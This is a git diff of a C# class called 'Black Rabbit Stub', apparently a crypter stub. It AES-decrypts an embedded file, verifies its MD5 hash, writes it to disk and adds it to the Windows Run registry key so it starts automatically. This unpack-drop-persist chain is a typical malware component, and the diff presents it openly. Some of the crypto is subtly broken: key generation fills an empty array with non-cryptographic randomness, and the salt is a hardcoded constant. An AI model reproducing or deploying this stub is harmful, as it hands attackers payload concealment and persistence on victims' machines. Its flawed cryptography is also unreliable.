@@ -7,32 +7,28 @@ using Microsoft.Win32;
 /// <summary>
 /// Black Rabbit Stub Class
 /// </summary>
-public class brstub
+public class Brstub
 {
-    //variables
+   
 
-    byte[] decrypted;
-<<<<<<< HEAD
-=======
-
-    public byte[] Decrypted { get => decrypted; }
->>>>>>> master
-
-    public byte[] Decrypted { get => decrypted; }
-
-    public enum regKeyType
+    /// <summary>
+    /// Type of register key.
+    /// </summary>
+    public enum RegKeyType
     {
-        CurrentUser,
+#pragma warning disable CS1591
+        CurrentUser,    
         LocalMachine
+#pragma warning restore CS1591
     }
 
     //PRIVATE METHODS
 
-    private static string GetMd5Hash(MD5 md5Hash, string input)
+    private static string GetMd5Hash(MD5 md5Hash, byte[] input)
     {
 
         // Convert the input string to a byte array and compute the hash.
-        byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
+        byte[] data = md5Hash.ComputeHash(input);
 
         // Create a new Stringbuilder to collect the bytes
         // and create a string.
@@ -52,13 +48,18 @@ public class brstub
     //PUBLIC METHODS
 
     //untested
-    public static string GetMd5Hash(string input)
+    /// <summary>
+    /// Generate MD5 hash.
+    /// </summary>
+    /// <param name="input">Byte array of data to hash</param>
+    /// <returns>Hash as string.</returns>
+    public string GetMd5Hash(byte[] input)
     {
 
         
         MD5 md5Hash = MD5.Create(); 
         // Convert the input string to a byte array and compute the hash.
-        byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
+        byte[] data = md5Hash.ComputeHash(input);
 
         // Create a new Stringbuilder to collect the bytes
         // and create a string.
@@ -75,12 +76,13 @@ public class brstub
         return sBuilder.ToString();
     }
 
+    /*
     /// <summary>
     /// Encrypt file with random key and IV.
     /// </summary>
     /// <param name="file">File as byte array.</param>
     /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=key, Item3=IV </returns>
-    public Tuple<byte[], byte[], byte[]> encrypt(byte[] file)
+    public Tuple<byte[], byte[], byte[]> Encrypt(byte[] file)
     {
         byte[] encrypted;
         byte[] key;
@@ -89,11 +91,11 @@ public class brstub
         using (Aes aesecr = Aes.Create())
         {
 
-            aesdcr.BlockSize = 128;
-            aesdcr.KeySize = 256;
-            aesdcr.Mode = CipherMode.CBC;
+            aesecr.BlockSize = 128;
+            aesecr.KeySize = 256;
+            aesecr.Mode = CipherMode.CBC;
 
-            aesecr.Key = aesecr.GenerateKey;
+            aesecr.GenerateKey();
             aesecr.GenerateIV();
 
             key = aesecr.Key;
@@ -108,13 +110,10 @@ public class brstub
             {
                 using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                 {
-                    using (var swEncrypt = new StreamWriter(csEncrypt))
-                    {
-                        //Write all data to the stream.
-                        swEncrypt.Write(file);
-                    }
-                    encrypted = msEncrypt.ToArray();
+                    msEncrypt.Write(file, 0, file.Length);
+                    csEncrypt.Close();
                 }
+                encrypted = msEncrypt.ToArray();
             }
         }
         return new Tuple<byte[], byte[], byte[]>(encrypted, key, IV);
@@ -124,9 +123,9 @@ public class brstub
     /// Encrypt file with user set key and random IV.
     /// </summary>
     /// <param name="file">File as byte array.</param>
-    /// <param name="IV">IV as byte array.</param>
+    /// <param name="key">Key as byte array.</param>
     /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=IV </returns>
-    public Tuple<byte[], byte[]> encrypt(byte[] file, byte[] key)
+    public Tuple<byte[], byte[]> Encrypt(byte[] file, byte[] key)
     {
         byte[] encrypted;
         byte[] IV;
@@ -134,9 +133,9 @@ public class brstub
         using (Aes aesecr = Aes.Create())
         {
 
-            aesdcr.BlockSize = 128;
-            aesdcr.KeySize = 256;
-            aesdcr.Mode = CipherMode.CBC;
+            aesecr.BlockSize = 128;
+            aesecr.KeySize = 256;
+            aesecr.Mode = CipherMode.CBC;
 
             aesecr.Key = key;
             aesecr.GenerateIV();
@@ -152,13 +151,11 @@ public class brstub
             {
                 using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                 {
-                    using (var swEncrypt = new StreamWriter(csEncrypt))
-                    {
-                        //Write all data to the stream.
-                        swEncrypt.Write(file);
-                    }
-                    encrypted = msEncrypt.ToArray();
+                    msEncrypt.Write(file, 0, file.Length);
+                    csEncrypt.Close();
+
                 }
+                encrypted = msEncrypt.ToArray();
             }
         }
         return new Tuple<byte[], byte[]>(encrypted, IV);
@@ -171,7 +168,7 @@ public class brstub
     /// <param name="key">Key as byte array.</param>
     /// <param name="IV">IV as byte array.</param>
     /// <returns></returns>
-    public byte[] encrypt(byte[] file, byte[] key, byte[] IV)
+    public byte[] Encrypt(byte[] file, byte[] key, byte[] IV)
     {
         byte[] encrypted;
 
@@ -179,28 +176,26 @@ public class brstub
         using (Aes aesecr = Aes.Create())
         {
 
-            aesdcr.BlockSize = 128;
-            aesdcr.KeySize = 256;
-            aesdcr.Mode = CipherMode.CBC;
+            aesecr.BlockSize = 128;
+            aesecr.KeySize = 256;
+            aesecr.Mode = CipherMode.CBC;
 
             aesecr.Key = key;
             aesecr.IV = IV;
 
 
-            var encryptor = aesecr.CreateEncryptor(aesecr.Key, aesecr.IV);
+            ICryptoTransform encryptor = aesecr.CreateEncryptor(aesecr.Key, aesecr.IV);
 
             // Create the streams used for encryption. 
             using (var msEncrypt = new MemoryStream())
             {
                 using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                 {
-                    using (var swEncrypt = new StreamWriter(csEncrypt))
-                    {
-                        //Write all data to the stream.
-                        swEncrypt.Write(file);
-                    }
-                    encrypted = msEncrypt.ToArray();
+                    msEncrypt.Write(file, 0, file.Length);
+                    csEncrypt.Close();
+                   
                 }
+                encrypted = msEncrypt.ToArray();
             }
         }
         return encrypted;
@@ -214,7 +209,7 @@ public class brstub
     /// <param name="key">Key as byte array.</param>
     /// <param name="IV">IV as byte array.</param>
     /// <returns>Byte array of decrypted file.</returns>
-    public byte[] decrypt(byte[] encFile, byte[] key, byte[] IV)
+    public byte[] Decrypt(byte[] encFile, byte[] key, byte[] IV)
     {
 
         
@@ -230,31 +225,123 @@ public class brstub
 
             ICryptoTransform decryptor = aesdcr.CreateDecryptor(aesdcr.Key, aesdcr.IV);
 
-            using (var msDecrypt = new MemoryStream(enc_exe))
+            using (var msDecrypt = new MemoryStream(encFile))
             {
                 using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                 {
-                    using (var srDecrypt = new StreamReader(csDecrypt))
-                    {
+                    //csDecrypt.Write(encFile, 0, encFile.Length);
+                    //csDecrypt.Close();
+                }   
 
-                        // Read the decrypted bytes from the decrypting stream
-                        // and place them in a string.
-                        decrypted = srDecrypt.ReadToEnd();
-                    }
-                }
+                decrypted = msDecrypt.ToArray();
             }
         }
 
         return decrypted;
     }
+   
+    */
+    /// <summary>
+    /// Generate key.
+    /// </summary>
+    /// <returns></returns>
+    public byte[] GenKey()
+    {
+        byte[] key= { };
 
-    
+        Random rnd = new Random();
+        rnd.NextBytes(key);
+
+        return key;
+    }
+
+    /// <summary>
+    /// Encrypting data.
+    /// </summary>
+    /// <param name="bytesToBeEncrypted">Data to encrypt as byte array.</param>
+    /// <param name="passwordBytes">Key as byte array.</param>
+    /// <returns>Encrypted data as byte array.</returns>
+    public byte[] Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+    {
+        byte[] encryptedBytes = null;
+
+        // Set your salt here, change it to meet your flavor:
+        // The salt bytes must be at least 8 bytes.
+        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+        using (MemoryStream ms = new MemoryStream())
+        {
+            using (RijndaelManaged AES = new RijndaelManaged())
+            {
+                AES.KeySize = 256;
+                AES.BlockSize = 128;
+
+                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                AES.Key = key.GetBytes(AES.KeySize / 8);
+                AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                AES.Mode = CipherMode.CBC;
+
+                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                {
+                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                    cs.Close();
+                }
+                encryptedBytes = ms.ToArray();
+            }
+        }
+
+        return encryptedBytes;
+    }
+
+    /// <summary>
+    /// Decrypting data.
+    /// </summary>
+    /// <param name="bytesToBeDecrypted">Data to decrypt as byte array.</param>
+    /// <param name="passwordBytes">Key as byte array.</param>
+    /// <returns>Decrypted data as byte array</returns>
+    public byte[] Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
+    {
+        byte[] decryptedBytes = null;
+
+        // Set your salt here, change it to meet your flavor:
+        // The salt bytes must be at least 8 bytes.
+        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+        using (MemoryStream ms = new MemoryStream())
+        {
+            using (RijndaelManaged AES = new RijndaelManaged())
+            {
+                AES.KeySize = 256;
+                AES.BlockSize = 128;
+
+                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                AES.Key = key.GetBytes(AES.KeySize / 8);
+                AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                AES.Mode = CipherMode.CBC;
+
+                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
+                {
+                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
+                    cs.Close();
+                }
+                decryptedBytes = ms.ToArray();
+            }
+        }
+
+        return decryptedBytes;
+    }
+
+
+
     /// <summary>
     /// Check's decrypted file is correct.
     /// </summary>
+    /// <param name="decrypted">This is decrypted file table.</param>
     /// <param name="hashMD5">This is hash require to compare with decrypted file hash.</param>
     /// <returns>Return true if hashes are  same, false if hashes are different.</returns>
-    public bool checkMD5(string hashMD5)
+    public bool CheckMD5(byte[] decrypted ,string hashMD5)
     {
         using ( MD5 md5Hash = MD5.Create())
         {
@@ -264,7 +351,7 @@ public class brstub
             // Create a StringComparer an compare the hashes.
             StringComparer comparer = StringComparer.OrdinalIgnoreCase;
 
-            if (0 == comparer.Compare(hashOfInput, hash)) return true;
+            if (0 == comparer.Compare(hashOfInput, hashMD5)) return true;
             
             else return false;
         }
@@ -276,7 +363,7 @@ public class brstub
     /// <param name="path">Path to save file</param>
     /// <returns>Return true if file's exist ,false if isn't exist.</returns>
     
-    public bool saveFile(string path )
+    public bool SaveFile(string path ,byte[] decrypted)
     {
         File.WriteAllBytes(path, decrypted);
 
@@ -290,21 +377,23 @@ public class brstub
     /// <param name="appName">App name in name field in register.</param>
     /// <param name="path">Path to file to autostart.</param>
     /// <param name="regKey">Switcher between CurrentUser key and LocalMachine key(administrator required). </param>
-    /// <returns></returns>
-    public void addToReg(string appName, string path, regKeyType regKey)
+    /// <returns>True if register is set or false if error.</returns>
+    public bool AddToReg(string appName, string path, RegKeyType regKey)
     {
         RegistryKey rkApp;
-
-        if (regKey == regKeyType.CurrentUser)
+        if (regKey == RegKeyType.CurrentUser)
         {
             rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         }
-        else if(regKey == regKeyType.LocalMachine)
+        else if (regKey == RegKeyType.LocalMachine)
         {
             rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         }
+        else return false;
+
         rkApp.SetValue(appName, path);
         rkApp.Close();
+        return true;
     }
     
 }
